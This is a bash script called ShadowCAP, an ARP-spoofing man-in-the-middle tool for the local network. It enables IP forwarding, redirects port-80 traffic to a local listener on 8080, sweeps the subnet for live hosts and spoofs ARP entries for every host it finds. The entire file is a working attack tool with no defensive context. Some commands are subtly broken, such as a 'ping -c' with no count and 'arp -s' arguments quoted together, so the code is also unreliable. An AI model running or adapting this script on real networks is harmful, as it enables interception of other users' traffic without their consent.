#!/bin/bash
# ShadowCAP
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)

# Helpers
BOLD=$(tput bold)
NC=$(tput setab 9 && tput sgr0)
VERSION='0.0.1'

# Targets array
TARGETS_IPS=()
TARGETS_MAC_ADDRESS=()

# Exit function
exiting(){
	tput clear
	echo -e "${BOLD}Exiting..$NC"
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo 0 > /proc/sys/net/ipv4/ip_nonlocal_bind
	echo 0 > /proc/sys/net/ipv4/conf/all/arp_filter
	for i in "${!TARGETS_IPS[@]}"; do
		arp -s "${TARGETS_IPS[$i]} $TARGETS_MAC_ADDRESS"
	done
	#service network-manager restart && wait;
	exit 1
}

trap exiting SIGINT # Ctrl+C
trap exiting SIGQUIT # Terminate
trap exiting SIGTSTP # Ctrl+Z

# Check if is root
if [ "$(id -u)" != "0" ]; then
	echo "[${BOLD}✘${NC}] This script must be run as root" 1>&2
	exit 1
fi

# Check VPN
GETPEER=$(ip -f inet a|grep -oP "(?<=inet ).+(?=\/)" | grep peer)
if [[ $GETPEER ]]; then
	echo "[${BOLD}✘${NC}] Disable VPN to use this script" 1>&2
	exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/ip_nonlocal_bind
echo 1 > /proc/sys/net/ipv4/conf/all/arp_filter

# Packets targeting port 80 is delivered to local app listening on 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Get interface
IFACE=$(ip route |grep default |sed -e "s/^.*dev.//" -e "s/.proto.*//")
NEWMAC=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')

# Change to random MAC Address
#echo -e "\n[${BOLD}I${NC}] [$IFACE] Random MAC Address"
#sudo ip link set dev $IFACE down
#sudo ip link set dev $IFACE address $NEWMAC
#sudo ip link set dev $IFACE up
#service network-manager restart && wait;

# Get INFO
IP=$(hostname -I |cut -d' ' -f1)
MAC=$(ip a |awk '/ether/ {print $2}'|head -n 1)
IPRANGE=$(echo $IP | cut -d'.' -f -1,2,3)
GATEWAY=$(ip route | awk '/default/ { print $3 }')

# Display INFO
echo -e "\n[${BOLD}I${NC}] [$IFACE] $IP: $MAC ✔"
echo -e "[${BOLD}I${NC}] [Gateway] $GATEWAY ✔\n"

# Check hosts alive
echo -e "[${BOLD}I${NC}] Checking hosts alive:\n"

# Ping broadcast
ping -c -i 0.1 -b "$IPRANGE".255 &>/dev/null;wait;

# Check ARP
for ip in "$IPRANGE".{1..254}; do
	THISARP=$(arp -n $ip | grep ether)
	if ([[ $THISARP ]] && [ "$(echo $THISARP|cut -d' ' -f -1)" != "$GATEWAY" ]); then
		TARGETS_IPS+=($ip)
		TARGETS_MAC_ADDRESS+=($(echo $THISARP|cut -d' ' -f3))
	fi
done

# Spoof
for i in "${!TARGETS_IPS[@]}"; do
	arp -s "${TARGETS_IPS[$i]} $MAC"
	ping -i 0.3 "${TARGETS_IPS[$i]}" &>/dev/null
done
